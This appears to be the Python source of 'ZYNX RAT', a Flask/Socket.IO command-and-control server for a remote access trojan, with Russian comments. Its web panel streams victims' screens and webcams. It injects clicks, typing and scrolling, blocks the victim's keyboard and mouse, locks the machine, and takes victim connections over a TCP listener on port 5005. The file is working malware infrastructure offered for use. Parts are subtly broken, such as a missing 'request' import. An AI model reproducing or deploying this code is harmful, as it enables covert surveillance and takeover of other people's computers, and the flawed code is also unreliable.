# app.py - ПОЛНАЯ ВЕРСИЯ ДЛЯ RENDER (БЕЗ pyautogui!)
from flask import Flask, render_template_string
from flask_socketio import SocketIO, emit
import base64
import json
import time
import os
import socket
import threading

app = Flask(__name__)
app.config['SECRET_KEY'] = 'secret!'
socketio = SocketIO(app, cors_allowed_origins="*")

victims = []
clients = []
current_frame = None
webcam_frame = None

# ==================== HTML (АДМИНКА) ====================
HTML = """
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>ZYNX RAT</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
    <script src="https://cdn.socket.io/4.7.2/socket.io.min.js"></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        html, body {
            height: 100%;
            overflow: hidden;
            background: #0a0a12;
            font-family: 'Segoe UI', system-ui, sans-serif;
        }
        body { display: flex; justify-content: center; align-items: center; padding: 8px; }
        .container {
            width: 100%;
            height: 100%;
            max-width: 1400px;
            max-height: 900px;
            display: flex;
            flex-direction: column;
            gap: 6px;
        }
        .header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 8px 16px;
            background: rgba(0,212,255,0.03);
            border: 1px solid rgba(0,212,255,0.08);
            border-radius: 10px;
            flex-shrink: 0;
            min-height: 48px;
        }
        .header .logo { display: flex; align-items: center; gap: 10px; }
        .header .logo i { font-size: 22px; color: #00d4ff; }
        .header .logo h1 { font-size: 18px; font-weight: 800; background: linear-gradient(90deg, #00d4ff, #00ff88); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
        .header .status { display: flex; gap: 16px; font-size: 11px; color: #888; }
        .header .status .stat { display: flex; align-items: center; gap: 4px; }
        .online { color: #00ff88; }
        .offline { color: #ff4444; }
        .video-box {
            flex: 1;
            min-height: 0;
            background: #000;
            border: 1px solid rgba(0,212,255,0.08);
            border-radius: 12px;
            overflow: hidden;
            position: relative;
            cursor: crosshair;
        }
        .video-box img { width: 100%; height: 100%; object-fit: contain; display: block; }
        .video-box .placeholder {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            color: #00d4ff;
            opacity: 0.25;
            text-align: center;
            pointer-events: none;
        }
        .video-box .placeholder i { font-size: 48px; display: block; margin-bottom: 8px; }
        .video-box .placeholder span { font-size: 13px; letter-spacing: 2px; }
        .controls {
            display: flex;
            gap: 5px;
            padding: 4px 0;
            flex-shrink: 0;
            flex-wrap: wrap;
            justify-content: center;
        }
        .btn {
            background: rgba(0,212,255,0.05);
            color: #00d4ff;
            border: 1px solid rgba(0,212,255,0.08);
            border-radius: 8px;
            padding: 6px 12px;
            font-weight: 600;
            font-size: 11px;
            cursor: pointer;
            transition: all 0.2s;
            display: flex;
            align-items: center;
            gap: 5px;
            user-select: none;
            white-space: nowrap;
            min-height: 32px;
        }
        .btn:hover { background: rgba(0,212,255,0.1); transform: translateY(-1px); }
        .btn.active { background: rgba(0,212,255,0.15); border-color: #00d4ff; }
        .btn.danger { border-color: rgba(255,0,68,0.15); color: #ff0044; }
        .btn.danger:hover { background: rgba(255,0,68,0.08); }
        .btn i { font-size: 13px; }
        .modal {
            display: none;
            position: fixed;
            bottom: 80px;
            left: 50%;
            transform: translateX(-50%);
            background: rgba(10,10,18,0.95);
            backdrop-filter: blur(12px);
            border: 1px solid rgba(0,212,255,0.1);
            border-radius: 12px;
            padding: 16px 20px;
            z-index: 1000;
            min-width: 300px;
            max-width: 90%;
        }
        .modal input {
            background: rgba(0,212,255,0.05);
            color: #00d4ff;
            border: 1px solid rgba(0,212,255,0.1);
            border-radius: 8px;
            padding: 10px 14px;
            width: 100%;
            font-size: 15px;
            outline: none;
        }
        .modal .hint {
            font-size: 9px;
            opacity: 0.25;
            margin-top: 6px;
            text-align: center;
            letter-spacing: 1px;
        }
        .webcam-window {
            display: none;
            position: fixed;
            bottom: 100px;
            right: 20px;
            width: 320px;
            background: #0a0a12;
            border: 1px solid rgba(0,212,255,0.2);
            border-radius: 12px;
            overflow: hidden;
            z-index: 999;
            box-shadow: 0 8px 40px rgba(0,0,0,0.8);
            cursor: move;
            resize: both;
        }
        .webcam-window .header-wc {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 6px 12px;
            background: rgba(0,212,255,0.05);
            border-bottom: 1px solid rgba(0,212,255,0.05);
            cursor: move;
        }
        .webcam-window .header-wc span {
            font-size: 11px;
            color: #00d4ff;
            font-weight: 600;
            letter-spacing: 1px;
        }
        .webcam-window .header-wc .close-wc {
            cursor: pointer;
            color: #ff4444;
            font-size: 16px;
            line-height: 1;
            padding: 0 4px;
        }
        .webcam-window .header-wc .close-wc:hover { color: #ff6666; }
        .webcam-window .video-wc {
            width: 100%;
            aspect-ratio: 16/9;
            background: #000;
        }
        .webcam-window .video-wc img {
            width: 100%;
            height: 100%;
            object-fit: contain;
            display: block;
        }
        .webcam-window .placeholder-wc {
            display: flex;
            align-items: center;
            justify-content: center;
            width: 100%;
            height: 100%;
            color: #00d4ff;
            opacity: 0.2;
            font-size: 12px;
            letter-spacing: 1px;
        }
        @media (max-width: 600px) {
            .header .logo h1 { font-size: 14px; }
            .header .status { font-size: 9px; gap: 10px; }
            .btn { font-size: 9px; padding: 4px 8px; min-height: 28px; }
            .btn i { font-size: 11px; }
            .modal { min-width: 200px; padding: 12px 16px; }
            .webcam-window { width: 200px; bottom: 80px; right: 10px; }
        }
        @media (max-height: 500px) {
            .header { padding: 4px 10px; min-height: 32px; }
            .header .logo i { font-size: 16px; }
            .header .logo h1 { font-size: 14px; }
            .controls { gap: 3px; }
            .btn { font-size: 9px; padding: 3px 8px; min-height: 24px; }
            .btn i { font-size: 10px; }
            .webcam-window { width: 160px; bottom: 60px; }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <div class="logo">
                <i class="fas fa-skull"></i>
                <h1>ZYNX RAT</h1>
            </div>
            <div class="status">
                <span class="stat"><i class="fas fa-circle" id="statusDot" style="color:#ff4444;"></i> <span id="statusText" class="offline">OFF</span></span>
                <span class="stat"><i class="fas fa-users"></i> <span id="clients">0</span></span>
                <span class="stat"><i class="fas fa-tachometer-alt"></i> <span id="fps">0</span></span>
            </div>
        </div>

        <div class="video-box" id="videoBox">
            <img id="screen" src="" alt="Screen">
            <div class="placeholder" id="placeholder">
                <i class="fas fa-desktop"></i>
                <span>AWAITING CONNECTION</span>
            </div>
        </div>

        <div class="controls">
            <button class="btn" id="kbBtn" onclick="toggleKb()"><i class="fas fa-keyboard"></i> KB</button>
            <button class="btn" id="msBtn" onclick="toggleMs()"><i class="fas fa-mouse"></i> MS</button>
            <button class="btn" id="webcamBtn" onclick="toggleWebcam()"><i class="fas fa-video"></i> WEBCAM</button>
            <button class="btn" onclick="sendCommand('lock')"><i class="fas fa-lock"></i> LOCK</button>
            <button class="btn" onclick="showModal()"><i class="fas fa-edit"></i> TYPE</button>
            <button class="btn danger" onclick="sendCommand('disconnect')"><i class="fas fa-power-off"></i> KILL</button>
        </div>
    </div>

    <div class="modal" id="modal">
        <input type="text" id="textInput" placeholder="Type and press Enter...">
        <div class="hint">PRESS ENTER TO SEND</div>
    </div>

    <div class="webcam-window" id="webcamWindow">
        <div class="header-wc" id="webcamHeader">
            <span><i class="fas fa-video"></i> WEBCAM</span>
            <span class="close-wc" onclick="closeWebcam()">✕</span>
        </div>
        <div class="video-wc" id="webcamVideo">
            <img id="webcamImg" src="" alt="Webcam">
            <div class="placeholder-wc" id="webcamPlaceholder">
                <i class="fas fa-camera"></i> NO CAMERA
            </div>
        </div>
    </div>

    <script>
        const socket = io();
        const screen = document.getElementById('screen');
        const placeholder = document.getElementById('placeholder');
        const statusText = document.getElementById('statusText');
        const statusDot = document.getElementById('statusDot');
        const clientsEl = document.getElementById('clients');
        const fpsEl = document.getElementById('fps');
        const videoBox = document.getElementById('videoBox');
        const modal = document.getElementById('modal');
        const textInput = document.getElementById('textInput');
        const webcamWindow = document.getElementById('webcamWindow');
        const webcamImg = document.getElementById('webcamImg');
        const webcamPlaceholder = document.getElementById('webcamPlaceholder');
        const webcamBtn = document.getElementById('webcamBtn');

        let connected = false;
        let frameCount = 0;
        let lastFpsUpdate = Date.now();
        let webcamActive = false;

        socket.on('connect', () => {
            connected = true;
            statusText.textContent = 'ON';
            statusText.className = 'online';
            statusDot.style.color = '#00ff88';
            placeholder.style.display = 'none';
        });

        socket.on('disconnect', () => {
            connected = false;
            statusText.textContent = 'OFF';
            statusText.className = 'offline';
            statusDot.style.color = '#ff4444';
            placeholder.style.display = 'block';
        });

        socket.on('frame', (data) => {
            screen.src = 'data:image/jpeg;base64,' + data;
            frameCount++;
            const now = Date.now();
            if (now - lastFpsUpdate > 1000) {
                fpsEl.textContent = frameCount;
                frameCount = 0;
                lastFpsUpdate = now;
            }
        });

        socket.on('webcam_frame', (data) => {
            webcamImg.src = 'data:image/jpeg;base64,' + data;
            webcamPlaceholder.style.display = 'none';
        });

        socket.on('clients_count', (count) => { clientsEl.textContent = count; });

        function sendCommand(cmd, val) {
            socket.emit('command', {cmd: cmd, val: val});
        }

        videoBox.addEventListener('click', function(e) {
            const rect = this.getBoundingClientRect();
            const x = ((e.clientX - rect.left) / rect.width) * 100;
            const y = ((e.clientY - rect.top) / rect.height) * 100;
            socket.emit('command', {cmd: 'click', val: {x: x, y: y, button: 'left'}});
        });

        videoBox.addEventListener('contextmenu', function(e) {
            e.preventDefault();
            const rect = this.getBoundingClientRect();
            const x = ((e.clientX - rect.left) / rect.width) * 100;
            const y = ((e.clientY - rect.top) / rect.height) * 100;
            socket.emit('command', {cmd: 'click', val: {x: x, y: y, button: 'right'}});
        });

        videoBox.addEventListener('wheel', function(e) {
            e.preventDefault();
            const delta = e.deltaY > 0 ? 'down' : 'up';
            socket.emit('command', {cmd: 'scroll', val: {delta: delta}});
        });

        function toggleKb() {
            const btn = document.getElementById('kbBtn');
            const active = btn.classList.toggle('active');
            btn.innerHTML = active ? '<i class="fas fa-keyboard"></i> BLOCK' : '<i class="fas fa-keyboard"></i> KB';
            socket.emit('command', {cmd: 'block_kb', val: active});
        }

        function toggleMs() {
            const btn = document.getElementById('msBtn');
            const active = btn.classList.toggle('active');
            btn.innerHTML = active ? '<i class="fas fa-mouse"></i> BLOCK' : '<i class="fas fa-mouse"></i> MS';
            socket.emit('command', {cmd: 'block_mouse', val: active});
        }

        function toggleWebcam() {
            webcamActive = !webcamActive;
            webcamBtn.classList.toggle('active', webcamActive);
            webcamBtn.innerHTML = webcamActive ? '<i class="fas fa-video"></i> ON' : '<i class="fas fa-video"></i> WEBCAM';
            webcamWindow.style.display = webcamActive ? 'block' : 'none';
            socket.emit('command', {cmd: 'webcam', val: webcamActive});
            if (webcamActive) {
                webcamPlaceholder.style.display = 'flex';
                webcamImg.src = '';
            }
        }

        function closeWebcam() {
            webcamActive = false;
            webcamBtn.classList.remove('active');
            webcamBtn.innerHTML = '<i class="fas fa-video"></i> WEBCAM';
            webcamWindow.style.display = 'none';
            socket.emit('command', {cmd: 'webcam', val: false});
        }

        function showModal() {
            modal.style.display = 'block';
            textInput.focus();
        }

        textInput.addEventListener('keydown', function(e) {
            if (e.key === 'Enter') {
                const text = this.value;
                if (text) {
                    socket.emit('command', {cmd: 'type', val: {text: text}});
                    this.value = '';
                    modal.style.display = 'none';
                }
            }
            if (e.key === 'Escape') {
                modal.style.display = 'none';
            }
        });

        let isDragging = false;
        let dragOffsetX, dragOffsetY;
        const webcamHeader = document.getElementById('webcamHeader');

        webcamHeader.addEventListener('mousedown', function(e) {
            isDragging = true;
            const rect = webcamWindow.getBoundingClientRect();
            dragOffsetX = e.clientX - rect.left;
            dragOffsetY = e.clientY - rect.top;
            webcamWindow.style.cursor = 'grabbing';
        });

        document.addEventListener('mousemove', function(e) {
            if (!isDragging) return;
            const x = e.clientX - dragOffsetX;
            const y = e.clientY - dragOffsetY;
            webcamWindow.style.left = x + 'px';
            webcamWindow.style.top = y + 'px';
            webcamWindow.style.right = 'auto';
            webcamWindow.style.bottom = 'auto';
        });

        document.addEventListener('mouseup', function() {
            isDragging = false;
            webcamWindow.style.cursor = 'default';
        });

        const cursorDot = document.createElement('div');
        cursorDot.style.cssText = `
            position: absolute;
            width: 6px;
            height: 6px;
            background: #00ff88;
            border-radius: 50%;
            pointer-events: none;
            transform: translate(-50%, -50%);
            display: none;
            box-shadow: 0 0 12px rgba(0,255,136,0.5);
            z-index: 10;
        `;
        videoBox.appendChild(cursorDot);

        videoBox.addEventListener('mousemove', function(e) {
            const rect = this.getBoundingClientRect();
            const x = e.clientX - rect.left;
            const y = e.clientY - rect.top;
            cursorDot.style.display = 'block';
            cursorDot.style.left = x + 'px';
            cursorDot.style.top = y + 'px';
        });

        videoBox.addEventListener('mouseleave', function() {
            cursorDot.style.display = 'none';
        });
    </script>
</body>
</html>
"""

@app.route('/')
def index():
    return render_template_string(HTML)

# ==================== WEBSOCKET ====================
@socketio.on('connect')
def handle_connect():
    print('[+] Админ подключился')
    emit('clients_count', len(victims), broadcast=True)

@socketio.on('disconnect')
def handle_disconnect():
    print('[-] Админ отключился')

@socketio.on('command')
def handle_command(data):
    cmd = data.get('cmd')
    val = data.get('val')
    print(f'[CMD] {cmd} = {val}')
    emit('command', {'cmd': cmd, 'val': val}, broadcast=True, include_self=False)

@socketio.on('victim_connect')
def handle_victim_connect():
    clients.append(request.sid)
    print(f'[+] Жертва (WS): {request.sid}')
    emit('clients_count', len(clients), broadcast=True)

@socketio.on('victim_frame')
def handle_victim_frame(data):
    emit('frame', data, broadcast=True, include_self=False)

@socketio.on('webcam_frame')
def handle_webcam_frame(data):
    emit('webcam_frame', data, broadcast=True, include_self=False)

# ==================== TCP (опционально) ====================
def tcp_server():
    try:
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server.bind(('0.0.0.0', 5005))
        server.listen(10)
        print('[TCP] Сервер на порту 5005')
        while True:
            try:
                client, addr = server.accept()
                print(f'[TCP] Жертва: {addr}')
                victims.append(client)
                emit('clients_count', len(victims), broadcast=True)
                threading.Thread(target=handle_tcp_victim, args=(client,), daemon=True).start()
            except Exception as e:
                print(f'[TCP] Ошибка: {e}')
                time.sleep(1)
    except Exception as e:
        print(f'[TCP] Не запущен: {e}')

def handle_tcp_victim(client):
    try:
        while True:
            size_data = client.recv(4)
            if not size_data:
                break
            frame_size = int.from_bytes(size_data, 'big')
            frame_data = b''
            while len(frame_data) < frame_size:
                chunk = client.recv(min(frame_size - len(frame_data), 65536))
                if not chunk:
                    break
                frame_data += chunk
            if len(frame_data) == frame_size:
                b64 = base64.b64encode(frame_data).decode('utf-8')
                socketio.emit('frame', b64, broadcast=True)
    except:
        pass
    finally:
        if client in victims:
            victims.remove(client)
            emit('clients_count', len(victims), broadcast=True)
        client.close()

if __name__ == '__main__':
    threading.Thread(target=tcp_server, daemon=True).start()
    port = int(os.environ.get('PORT', 5000))
    socketio.run(app, host='0.0.0.0', port=port)
